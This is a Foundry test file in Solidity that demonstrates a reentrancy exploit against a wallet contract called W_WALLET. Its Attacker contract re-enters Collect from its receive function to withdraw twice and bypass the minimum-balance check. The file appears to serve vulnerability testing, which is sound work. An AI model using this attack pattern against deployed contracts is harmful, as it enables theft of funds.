
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/W_WALLET.sol";

contract TestReentrancyW_WALLET is Test {
    
    W_WALLET public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new W_WALLET(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // Constraint: attackVal must be >= MinSum (1 ether) to deposit.
        // Constraint: attackVal < 2 ether ensures that withdrawing half leaves < MinSum,
        // which would normally block the second withdrawal. This proves the reentrancy bypasses the check.
        vm.assume(attackVal >= 1 ether && attackVal < 2 ether);
        
        // Ensure attackVal is even for clean division
        attackVal = (attackVal / 2) * 2;
        uint256 withdrawAmount = attackVal / 2;

        vm.deal(address(_contractUnderTest), 10 ether);
        vm.deal(address(_attacker), 10 ether);
        vm.deal(address(this), 10 ether);

        // Setup: Deposit funds
        _attacker.setupAttack{value: attackVal}(attackVal);

        // Time Travel: Put sets unlockTime to block.timestamp. 
        // Collect requires block.timestamp > acc.unlockTime.
        vm.warp(block.timestamp + 100);

        // Trigger Attack
        _attacker.attack(withdrawAmount);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    W_WALLET public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedWithdrawVal;

    constructor(address victimAddress) { 
        _victim = W_WALLET(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        _victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        storedWithdrawVal = val;
        attackCallCount = 1;

        // Call the vulnerable function
        _victim.Collect(val);

        // If we managed to re-enter, the count will be > 1
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            _victim.Collect(storedWithdrawVal);
        }
    }
}
